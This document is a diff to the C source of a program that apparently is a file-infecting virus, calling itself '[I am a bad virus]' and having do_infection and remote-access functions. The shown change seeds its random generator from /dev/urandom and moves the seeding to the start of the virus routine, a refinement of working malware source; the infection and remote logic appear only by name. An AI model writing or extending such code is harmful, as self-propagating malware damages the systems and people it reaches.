@@ -47,8 +47,21 @@ uint32_t ft_rand(){
 		return seed;
 }
 
+uint32_t ft_true_rand(){
+	uint32_t	rval = 0;
+	int		fd;
+
+	if ((fd = ft_open("/dev/urandom", 0, 0)) != -1)
+	{
+		ft_read(fd, &rval, 4);
+		ft_close(fd);
+	}
+	return rval;
+}
+
 void ft_srand(){
 		seed = fingerprint;
+		seed ^= ft_true_rand();
 }
 
 void print_stats(){
@@ -119,6 +132,7 @@ void do_infection(){
 }
 
 int virus(void){
+		ft_srand();
 		debug("** Virus");
 		if (opt.do_remote) remote();
 		if (opt.do_dns_remote)
@@ -126,7 +140,6 @@ int virus(void){
 		if (opt.print_msg) println("[I am a bad virus]");
 
 		print_stats();
-		ft_srand();
 		do_infection();
 		debug("** End of Virus");
 		return TRUE;
